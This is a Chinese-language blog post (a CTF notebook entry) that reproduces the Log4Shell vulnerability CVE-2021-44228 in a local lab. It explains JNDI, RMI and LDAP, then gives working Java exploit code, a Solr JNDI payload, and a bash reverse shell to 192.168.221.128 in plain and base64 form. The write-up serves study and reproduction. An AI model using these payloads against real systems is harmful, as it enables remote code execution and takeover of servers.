@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Log4j漏洞复现 | Asiv's Blog</title><meta name="author" content="NiceAsiv"><meta name="copyright" content="NiceAsiv"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="主要内容 CVE-2021-44228 Apache Log4j漏洞复现 0x01.漏洞情况 		 影响范围： Apache Log4j 2.x &lt; 2.15.0-rc2 Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。 Spring-Boot-strater-log4j2、Apache Struts2、Apache Solr、Apache">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j漏洞复现">
+<meta property="og:url" content="https://niceasiv.cn/2022/07/17/log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Asiv&#39;s Blog">
+<meta property="og:description" content="主要内容 CVE-2021-44228 Apache Log4j漏洞复现 0x01.漏洞情况 		 影响范围： Apache Log4j 2.x &lt; 2.15.0-rc2 Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。 Spring-Boot-strater-log4j2、Apache Struts2、Apache Solr、Apache">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picx1.zhimg.com/v2-6c432537a88e7fdd8a275bd0bda88791_720w.jpg?source=172ae18b">
+<meta property="article:published_time" content="2022-07-17T12:51:09.000Z">
+<meta property="article:modified_time" content="2022-10-30T12:16:09.000Z">
+<meta property="article:author" content="NiceAsiv">
+<meta property="article:tag" content="Log4J">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picx1.zhimg.com/v2-6c432537a88e7fdd8a275bd0bda88791_720w.jpg?source=172ae18b"><link rel="shortcut icon" href="/sysimg/head.jpg"><link rel="canonical" href="https://niceasiv.cn/2022/07/17/log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Log4j漏洞复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-30 20:16:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/sysimg/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx1.zhimg.com/v2-6c432537a88e7fdd8a275bd0bda88791_720w.jpg?source=172ae18b')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Asiv's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Log4j漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-07-17T12:51:09.000Z" title="Created 2022-07-17 20:51:09">2022-07-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-10-30T12:16:09.000Z" title="Updated 2022-10-30 20:16:09">2022-10-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>8min</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="主要内容">主要内容</h2>
+<h1>CVE-2021-44228 Apache Log4j漏洞复现</h1>
+<h2 id="0x01-漏洞情况">0x01.漏洞情况</h2>
+<img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221030205831.png" style="zoom:90%;" />		
+<p><strong>影响范围：</strong><br>
+Apache Log4j 2.x &lt; 2.15.0-rc2</p>
+<p>Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
+<p>Spring-Boot-strater-log4j2、Apache Struts2、Apache Solr、Apache Flink、Apache Druid、ElasticSearch、Flume、Dubbo、Redis、Logstash、Kafka均受影响。</p>
+<h2 id="0x02-组件介绍">0x02.组件介绍</h2>
+<h3 id="RIM"><strong>RIM</strong></h3>
+<p>RMI ( Remote Method Invocation , 远程方法调用 ) 是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，例如CORBA、WebService，这两种是独立于编程语言的。而Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。</p>
+<p>另外，需要知道注册表的概念，说简单一点就是，服务端那里有一个对象，客户端想要调用服务端里的那个对象的方法，而注册表就像一个中间人，服务端会将自己提供的服务的实现类交给这个中间人 , 并公开一个名称 . 任何客户端都可以通过公开的名称找到这个实现类 , 并调用它。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221031100732.png" alt="img"></p>
+<h3 id="LDAP"><strong>LDAP</strong></h3>
+<p>LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。</p>
+<p>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p>
+<p>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。</p>
+<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。</p>
+<h3 id="JNDI"><strong>JNDI</strong></h3>
+<p>JNDI全称为Java Naming and Directory Interface，也就是Java命名和目录接口。</p>
+<p>既然是接口，那么就必定有其实现，而目前我们Java中使用最多的基本就是rmi和ldap的目录服务系统。</p>
+<p>而命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。</p>
+<p>而目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。</p>
+<p>而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象。</p>
+<p>总结的来说：JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/image-20220714170015281.png" alt="image-20220714170015281"></p>
+<p>注册中心服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/image-20220714170515169.png" alt="image-20220714170515169"></p>
+<p>抽象接口，他隔离了具体的资源,使得连接相关更便捷</p>
+<p><strong>JNDI则是Java中用于访问LDAP的API</strong> ，开发人员使用JNDI完成与LDAP 服务器 之间的通信，即用JNDI来访问LDAP，而不需要和具体的目录服务产品特性打交道。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/image-20220714170244335.png" alt="image-20220714170244335"></p>
+<p><strong>JNDI动态协议转换</strong><br>
+当我们调用lookup()方法时，如果lookup方法的参数像demo中那样是一个uri地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象</p>
+<p><strong>JNDl Naming Reference命名引用</strong><br>
+当有客户端通过lookup(“refObj”)获取远程对象时，获取的是一个Reference存根(Stub),由于是<br>
+Reference的存根，所以客户端会现在本地的<br>
+classpath中去检查是否存在类refClassName，如果不存在则去指定的url动态加载。</p>
+<p>当系统使用log4j通过$形式将用户输入的信息打印到日志时﹐那这就会出现JNDI注入漏洞</p>
+<h2 id="0x03-漏洞利用原理">0x03.漏洞利用原理</h2>
+<p><strong>利用条件</strong></p>
+<p>Java应用引入了log4j-api和log4j-core两个jar包</p>
+<p>当系统使用log4j通过$形式将用户输入的信息打印到日志时﹐那这就会出现JNDI注入漏洞</p>
+<p>黑客在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221031100945.png"  style="zoom: 100%;" />		·</p>
+<h2 id="0x04-漏洞复现">0x04.漏洞复现</h2>
+<h3 id="实验环境">实验环境</h3>
+<ul>
+<li>Windows 11</li>
+<li>jdk-8u212-windows jdk 1.8.121（理论上JDK 6u211、7u201、8u191之前的版本都行）</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></li>
+<li>log4j-api&amp;log4j-core 2.15.0-rc2</li>
+<li>docker</li>
+</ul>
+<h3 id="本地复现"><strong>本地复现</strong></h3>
+<h4 id="复现的流程">复现的流程</h4>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221030211050.png">·</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221031100341.png" style="zoom: 150%;" />·</p>
+<h4 id="server开启一个rmi">server开启一个rmi</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 本地主机上的远程对象注册表Registry的实例,默认端口1099</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line">            System.out.println(<span class="string">&quot;Create RMI registry on port 1099&quot;</span>);</span><br><span class="line">            <span class="comment">//返回的Java对象</span></span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;HackCode&quot;</span>,<span class="string">&quot;HackCode&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">            <span class="comment">// 把远程对象注册到RMI注册服务器上，并命名为hack</span></span><br><span class="line">            registry.bind(<span class="string">&quot;hack&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="恶意的代码库中的hack类">恶意的代码库中的hack类</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行任意的脚本，目前的脚本会使windows服务器打开计算器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackCode</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;受害服务器将执行下面命令行&quot;</span>);</span><br><span class="line">        Process p;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(fis);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span>((line=br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="客户端">客户端</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4j.class);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//有些高版本jdk需要打开此行代码</span></span><br><span class="line">        <span class="comment">//System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/hack&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//正常打印业务日志</span></span><br><span class="line">        logger.error(<span class="string">&quot;username:&#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
+<h3 id="docker搭建">docker搭建</h3>
+<blockquote>
+<p>我们将受害者和攻击者部署在本地局域网当中</p>
+<p>攻击机的ip 192.168.221.128</p>
+</blockquote>
+<h4 id="受害者部署">受害者部署</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">apt  install docker-compose</span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"><span class="built_in">cd</span> vulhub-master//log4j//CVE-2021-44228  <span class="comment"># 进入需要开启的漏洞路径</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221031100411.png" alt="image-20221031094500154"></p>
+<p>访问<code> http://127.0.0.1:8983/solr/#/</code></p>
+<h4 id="恶意JNDI服务器部署">恶意JNDI服务器部署</h4>
+<p>利用JNDI-Injection-Exploit进行注入,这个工具开启了三个服务，包括RMI、LDAP以及HTTP服务，然后生成JNDI链接</p>
+<h5 id="反弹shell">反弹shell</h5>
+<p>首先我们构造反弹shell用到的命令：(内网的机器反弹到外网机器上从而实现外网主机控制内网主机)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.221.128/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>bash -i</code>打开一个交互式的shell</li>
+<li><code>&gt;&amp;</code> 标准错误和标准输出重定向到文件</li>
+</ul>
+<p>​    对于这个<code>&gt;&amp;</code> <code>&amp;&gt;</code> 的解释可以看<a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error">bash的手册</a></p>
+<ul>
+<li>
+<p><code>&gt;/dev/tcp</code> bash特性，一种固定的格式调用底层函数打开一个socket,类似还有/dev/udp</p>
+</li>
+<li>
+<p><code>0&gt;&amp;1</code> 把输入重定向到标准输出</p>
+</li>
+</ul>
+<p><strong>这样外网的机器就可以获得一个完整的 shell</strong></p>
+<p>base64加密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyMS4xMjgvNjY2NiAwPiYx</span><br></pre></td></tr></table></figure>
+<p>可执行程序为jar包，在命令行中运行以下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [<span class="built_in">command</span>] [-A] [address]</span></span><br></pre></td></tr></table></figure>
+<p>其中:</p>
+<ul>
+<li>
+<p><strong>-C</strong> - 远程class文件中要执行的命令。</p>
+<p>（可选项 , 默认命令是mac下打开计算器，即&quot;open /Applications/Calculator.app&quot;）</p>
+</li>
+<li>
+<p><strong>-A</strong> - 服务器地址，可以是IP地址或者域名。</p>
+<p>（可选项 , 默认地址是第一个网卡地址）</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyMS4xMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;192.168.221.128&quot;</span><br></pre></td></tr></table></figure>
+<p>类似下方的截图,会生成服务的链接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/20221031100553.png" alt="img"></p>
+<p>同时在攻击机设置监听，监听由JNDI-Injection-Exploit恶意类注入后，反弹过来的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8787</span><br></pre></td></tr></table></figure>
+<h4 id="构造恶意请求">构造恶意请求</h4>
+<p>在攻击机访问受害者链接,并加上下方的payload,ldap:192.168.221.128:1389/wna7wt是我开启的ldap服务的地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap:192.168.221.128:1389/wna7wt&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-参考文献">0x05.参考文献</h2>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1917465">5 分钟复现 log4J 漏洞，手把手实现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014602228/article/details/121998454">Log4j 漏洞复现_william~的博客-CSDN博客_log4j漏洞复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Welk1n/p/11701401.html">JNDI-Injection-Exploit - Welk1n - 博客园 (cnblogs.com)</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Log4J/">Log4J</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/28/Adversary%20Agnostic%20Robust%20Deep%20Reinforcement%20Learning/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/asivwolf/PicCDN@main/pd_baselines_figures-Page-2.svg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Adversary Agnostic Robust Deep Reinforcement Learning</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/sysimg/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">NiceAsiv</div><div class="author-info__description">我的CTF技术笔记</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/asivwolf"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/Todo/" target="_blank" title="Todo"><i class="fas fa-tasks"></i></a><a class="social-icon" href="/pdf/" target="_blank" title="PDF"><i class="fas fa-file-pdf"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9"><span class="toc-text">主要内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">CVE-2021-44228 Apache Log4j漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%83%85%E5%86%B5"><span 